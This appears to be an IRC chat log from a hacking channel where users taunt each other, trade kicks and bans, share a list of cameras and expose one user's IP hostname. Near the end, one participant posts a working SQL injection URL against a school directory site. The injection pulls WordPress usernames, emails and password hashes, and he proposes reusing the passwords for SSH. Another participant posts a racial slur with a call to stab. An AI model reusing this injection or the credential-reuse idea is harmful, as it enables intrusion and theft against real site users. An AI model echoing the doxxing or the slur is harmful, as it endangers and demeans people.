+Jun 11 00:07:33 <Mutiny>	http://pastebin.com/rjqCmbK0 <-- My compiled list of cameras, cuz I was bored lolz
+Jun 11 00:07:46 <LordBulletproofGangster>	newbs101 :how a newb can teach another newb how to exploit using basic linux knowledge and an exploit thats been our for YEARS
+Jun 11 00:08:06 *	ryan1918 has kicked hellothere from #school4lulz (sucka)
+Jun 11 00:08:28 <LordBulletproofGangster>	wonder if TylerDurden did anything worth noting
+Jun 11 00:08:28 <hellothere>	lol ryan thinks he is a haxxor
+Jun 11 00:08:33 <wutthe>	<Ryan> [hellothere] is actually ~hellother@188-223-250-182.zone14.bethere.co.uk
+Jun 11 00:08:34 *	ryan1918 has kicked hellothere from #school4lulz (hacked)
+Jun 11 00:08:34 <takecare>	what vpn u guys reckon?
+Jun 11 00:08:40 *	ryan1918 has kicked hellothere from #school4lulz (i got you)
+Jun 11 00:08:46 *	ryan1918 has kicked hellothere from #school4lulz (ahahahah)
+Jun 11 00:09:03 <JBAIT>	takecare, the ones that hate the west
+Jun 11 00:09:34 <LordBulletproofGangster>	hey TylerDurden
+Jun 11 00:09:41 <LordBulletproofGangster>	if your such a great hacker
+Jun 11 00:09:42 <takecare>	name one :(?
+Jun 11 00:09:44 <LordBulletproofGangster>	hack me
+Jun 11 00:09:45 <LordBulletproofGangster>	:)
+Jun 11 00:09:51 <LordBulletproofGangster>	just saying
+Jun 11 00:09:57 <LordBulletproofGangster>	or
+Jun 11 00:10:00 <LordBulletproofGangster>	let me guess
+Jun 11 00:10:01 <ref>	how many times have i heard that...
+Jun 11 00:10:03 <LordKitsuna>	i swear to god LordBulletproofGangster your long name pissnig me off so much
+Jun 11 00:10:05 <LordBulletproofGangster>	1 hit wonder
+Jun 11 00:10:21 <LordBulletproofGangster>	if i am not vuln to the 1-2 exploits you mass scan for you cant hack
+Jun 11 00:10:28 <LordBulletproofGangster>	i need schooling on how to hack bro
+Jun 11 00:10:30 <LordBulletproofGangster>	TylerDurden
+Jun 11 00:10:32 <wutthe>	you as in your home machine?
+Jun 11 00:10:33 <LordBulletproofGangster>	give me some help
+Jun 11 00:10:37 <LordBulletproofGangster>	show me how to hack
+Jun 11 00:10:47 <ref>	LordBulletproofGangster, are you zmda
+Jun 11 00:11:00 <LordBulletproofGangster>	i want to see if your competant or just someone who would like to call themselves a hacker
+Jun 11 00:11:09 <TylerDurden>	http://codex.wordpress.org/Database_Description#Table:_wp_users also they run wordpress.
+Jun 11 00:11:14 <LordBulletproofGangster>	maybe i can school you in some shit TylerDurden
+Jun 11 00:11:17 <JBAIT>	LordBulletproofGangster probably feels 1337 with his OBSD
+Jun 11 00:11:19 <blu3beard>	lol lordkitsuna, me too
+Jun 11 00:11:27 <takecare>	what vpn u guys reckon?
+Jun 11 00:11:28 <blu3beard>	fucking up xchat...
+Jun 11 00:11:40 <LordBulletproofGangster>	actually
+Jun 11 00:11:49 <LordBulletproofGangster>	any oper can give you the IP to this box
+Jun 11 00:11:53 <wutthe>	fuck off we are trying to learn here
+Jun 11 00:12:01 <wutthe>	go to #lulzsec
+Jun 11 00:12:02 <LordBulletproofGangster>	and lol at you when they tell you it doesnt have IIS
+Jun 11 00:12:07 <LordBulletproofGangster>	or OBSD
+Jun 11 00:12:24 <LordBulletproofGangster>	ryan1918 and ryan both know the host i am connecting on
+Jun 11 00:12:38 <ref>	LordBulletproofGangster, dropped out of comp sci because he was too clever to pay attention to calculus, and come the final exams walked out after 5 minutes because 'it's all useless rubbish'
+Jun 11 00:12:39 <ryan1918>	of course
+Jun 11 00:12:55 <ryan1918>	quite down everyone
+Jun 11 00:12:57 <ryan1918>	im trying to sleep
+Jun 11 00:12:58 <LordBulletproofGangster>	ryan1918: is this box running OBSD ?
+Jun 11 00:13:00 *	LordKitsuna sets ban on *!*Krashed@*.oes.ca.gov
+Jun 11 00:13:00 *	LordKitsuna has kicked LordBulletproofGangster from #school4lulz (pm me when you have changed your name to something shorter)
+Jun 11 00:13:09 <blu3beard>	thank you ;)
+Jun 11 00:13:13 *	ryan1918 removes ban on *!*Krashed@*.oes.ca.gov
+Jun 11 00:13:15 <ryan1918>	hes fine
+Jun 11 00:13:17 <ryan1918>	just leave him
+Jun 11 00:13:21 <ryan1918>	he can annoy the others
+Jun 11 00:13:29 <LordKitsuna>	his name pushes my text so far over
+Jun 11 00:13:33 <LordKitsuna>	makes me wanna stab him
+Jun 11 00:13:36 <ryan1918>	yah
+Jun 11 00:13:39 <ryan1918>	ima make him change it
+Jun 11 00:13:40 <ryan1918>	or ban
+Jun 11 00:13:44 <eax>	STAB NIGGERS
+Jun 11 00:13:54 <eax>	STABBY STAB STABS
+Jun 11 00:13:57 <JBAIT>	nicks < 12
+Jun 11 00:14:02 <wutthe>	ouch
+Jun 11 00:14:05 *	Kred is now known as [Krashed]
+Jun 11 00:14:06 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20and%201=2%20UNION%20SELECT%201,2,%28select%20GROUP_CONCAT%28CONCAT%28user_login,%27|%27,user_email,%27|%27,user_pass,%27%3Cbr%3E%27%29%29%20from%20wordpress.wp_users%29,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60/* dox.
+Jun 11 00:14:21 *	God has kicked LordBulletproofGangster from #school4lulz (LordBulletproofGangster)
+Jun 11 00:14:24 <TylerDurden>	i bet one of them reuses ssh pass.
